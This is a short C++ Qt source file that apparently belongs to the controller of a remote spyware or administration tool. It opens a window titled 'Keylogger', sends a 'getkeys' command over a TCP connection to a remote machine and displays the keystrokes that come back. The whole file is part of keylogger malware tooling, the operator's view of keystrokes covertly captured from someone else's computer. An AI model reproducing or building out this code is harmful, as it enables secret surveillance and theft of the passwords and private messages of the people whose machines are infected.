#include "keylogs.h"

Keylogs::Keylogs(QTcpSocket *conn, QWidget *parent) : QMainWindow(parent)
{
    setWindowTitle(tr("Keylogger"));
    setWindowIcon(QIcon(":/img/keylog.png"));

    _conn = conn;

    connect(conn, &QTcpSocket::readyRead, this, &Keylogs::printData);

    _cent = new QWidget(this);
    _main = new QGridLayout(_cent);
    _text = new QTextEdit;
    _text->setReadOnly(true);

    _main->addWidget(_text);

    setCentralWidget(_cent);

    conn->write("getkeys\n");
    //_text->setText(conn->readAll());
}

Keylogs::~Keylogs()
{
    delete _main;
    delete _text;
    delete _cent;
}

void Keylogs::printData()
{
    _text->insertPlainText(_conn->readAll());
}

void Keylogs::closeEvent(QCloseEvent *event)
{
    disconnect(this, SLOT(printData()));
    event->accept();
}
